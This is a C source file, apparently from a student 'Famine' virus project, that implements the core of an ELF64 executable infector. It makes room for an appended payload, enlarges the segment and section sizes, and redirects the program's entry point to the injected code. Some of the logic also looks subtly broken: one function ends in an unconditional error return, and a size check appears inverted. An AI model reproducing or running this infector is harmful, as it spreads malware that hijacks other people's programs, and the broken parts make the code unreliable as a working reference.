/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   packer.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/07 02:26:23 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infect.h"
#include "errors.h"

static bool	change_entry(const struct safe_pointer info,
	const struct endians_pointer endians,
	const struct entry *original_entry)
{
	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));

	if (!clone_hdr)  return errors(ERR_CORRUPT, "wildly unreasonable");

	const Elf64_Xword	sh_offset         = endians.endian_8(original_entry->safe_shdr->sh_offset);
	const size_t		offset_in_section = original_entry->offset_in_section;
	const size_t		entry_off         = sh_offset + offset_in_section;
	const size_t		payload_offset    = original_entry->end_of_last_section;
	const Elf64_Xword	payload_distance  = payload_offset - entry_off;

	Elf64_Addr		e_entry = endians.endian_8(clone_hdr->e_entry);

	e_entry += payload_distance;
	clone_hdr->e_entry = endians.endian_8(e_entry);

	return true;
}

static bool	adjust_sizes(const struct endians_pointer endians,
	const struct safe_pointer info, size_t shift_amount)
{
	struct entry	clone_entry;
	const size_t	payload_size = end_payload - begin_payload;

	if (!find_entry(&clone_entry, info, endians)) return errors(ERR_THROW, "adjust_sizes");

	size_t		sh_size  = endians.endian_8(clone_entry.safe_last_section_shdr->sh_size);
	Elf64_Xword	p_filesz = endians.endian_8(clone_entry.safe_phdr->p_filesz);
	Elf64_Xword	p_memsz  = endians.endian_8(clone_entry.safe_phdr->p_memsz);

	sh_size  += payload_size;
	p_filesz += shift_amount;
	p_memsz  += shift_amount;

	clone_entry.safe_last_section_shdr->sh_size = endians.endian_8(sh_size);
	clone_entry.safe_phdr->p_filesz = endians.endian_8(p_filesz);
	clone_entry.safe_phdr->p_memsz  = endians.endian_8(p_memsz);

	return true;
}

static bool	define_shift_amount(const struct endians_pointer endians,
	const struct entry *original_entry, size_t *shift_amount)
{
	const size_t	p_filesz        = endians.endian_8(original_entry->safe_phdr->p_filesz);
	const size_t	p_offset        = endians.endian_8(original_entry->safe_phdr->p_offset);
	const size_t	segment_end     = p_offset + p_filesz;
	const size_t	payload_size    = end_payload - begin_payload;
	const size_t	segment_padding = segment_end - original_entry->end_of_last_section;

	if (payload_size < segment_padding)
	{
		*shift_amount = 0;
		return errors(ERR_THROW, "define_shift_amount");
	}

	const size_t	p_memsz = endians.endian_8(original_entry->safe_phdr->p_memsz);
	const size_t	p_align = endians.endian_8(original_entry->safe_phdr->p_align);

	*shift_amount = ALIGN(payload_size, SHIFT_ALIGNMENT);

	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
      return errors(ERR_USAGE, "insufficient memory padding "
      "in file (overflow of %lu bytes)", (end_padding - p_align));
}

bool		elf64_packer(const struct famine food, size_t original_file_size)
{
	struct entry	original_entry;
	size_t		shift_amount;

	if (!find_entry(&original_entry, food.original_safe, food.endians)
	|| !define_shift_amount(food.endians, &original_entry, &shift_amount)
	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
	|| !adjust_references(food.clone_safe , food.endians, shift_amount, &original_entry)
	|| !adjust_sizes(food.endians, food.clone_safe, shift_amount)
	|| !setup_payload(&original_entry, food.endians, food.clone_safe)
	|| !change_entry(food.clone_safe, food.endians, &original_entry))
		return errors(ERR_THROW, "elf64_packer");

	return true;
}
